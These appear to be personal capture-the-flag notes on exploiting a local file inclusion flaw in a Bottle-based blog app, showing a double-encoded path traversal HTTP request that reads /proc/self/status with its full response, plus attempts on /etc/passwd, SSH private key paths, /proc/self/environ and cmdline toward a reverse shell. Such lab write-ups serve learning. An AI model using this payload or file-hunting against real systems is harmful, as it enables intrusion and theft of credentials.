
Was able to see that we had `LFI` by listing `/etc/passwd` but was unable to find anything in the default locations such as `root/.ssh/id_rsa`, `/home/hcue/.ssh/id_rsa` 
- in order to get the `LFI` to work we need to double encode them with `CTRL+U x2`
#### /proc
default locations didnt lead anywhere so refered to `discord` messages which lead to look at the `/proc`
- https://www.kernel.org/doc/html/latest/filesystems/proc.html
this shows potential files to look for 
![[Pasted image 20241217110342.png]]
once we have knowledge of this path we begin testing - the first of which is `/proc/self/status`. In order to use this with the `LFI` utilized the request
- it is double encoded
request
```http
GET /view?page=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fproc%252fself%252fstatus HTTP/1.1
Host: bottleup:8080
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: name="!nkLtajFuXbtwrFsb87EDGg==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFZ3Vlc3SUc4aULg=="
Connection: keep-alive
```
response
```bash
Name:	python3
Umask:	0022
State:	R (running)
Tgid:	921
Ngid:	0
Pid:	921
PPid:	1
TracerPid:	0
Uid:	1000	1000	1000	1000
Gid:	1000	1000	1000	1000
FDSize:	128
Groups:	1000 
NStgid:	921
NSpid:	921
NSpgid:	921
NSsid:	921
VmPeak:	   28148 kB
VmSize:	   28148 kB
VmLck:	       0 kB
VmPin:	       0 kB
VmHWM:	   20540 kB
VmRSS:	   20540 kB
RssAnon:	   11556 kB
RssFile:	    8984 kB
RssShmem:	       0 kB
VmData:	   11532 kB
VmStk:	     132 kB
VmExe:	    2788 kB
VmLib:	    4936 kB
VmPTE:	      96 kB
VmSwap:	      84 kB
HugetlbPages:	       0 kB
CoreDumping:	0
THP_enabled:	1
Threads:	1
SigQ:	0/7572
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000001001000
SigCgt:	0000000180000002
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
NoNewPrivs:	0
Seccomp:	0
Speculation_Store_Bypass:	thread vulnerable
Cpus_allowed:	3
Cpus_allowed_list:	0-1
Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:	0
voluntary_ctxt_switches:	206039
nonvoluntary_ctxt_switches:	21627
```
burp of `request` & `response`
![[Pasted image 20241217111041.png]]
digging down this rabbit hole of `/proc` led me down this post as well as other blogs about `/proc/self/environ` as well as to go from `LFI > REVSHELL`
https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/#lfi-via-procselfenviron
![[Pasted image 20241216214020.png]]
testing to see if we can access `/proc/self/environ` and we do
![[Pasted image 20241217114931.png]]
checking to see if we have `/proc/self/cmdline` - this discovers the `/usr/bin/python3/opt/bottle-blog/app.py` which is the path
![[Pasted image 20241217115033.png]]